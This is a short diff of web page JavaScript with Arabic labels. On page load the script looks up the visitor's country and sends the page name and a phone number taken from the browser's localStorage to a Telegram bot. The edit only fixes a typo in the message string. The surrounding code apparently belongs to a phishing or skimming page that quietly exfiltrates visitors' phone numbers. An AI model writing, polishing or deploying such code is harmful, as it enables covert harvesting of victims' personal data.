@@ -595,7 +595,7 @@ document.addEventListener("DOMContentLoaded", function () {
     fetch('https://api.country.is').then(response => response.json())
       .then(data => {
         const country = data.country || "غير معروف";
-        const message = `الصفحة:${pageName}\nvرقم الهاتف:${localStorage.getItem('phonenumber')}`;
+        const message = `الصفحة:${pageName}\n رقم الهاتف:${localStorage.getItem('phonenumber')}`;
         send_telegram_message(message)
       })
 
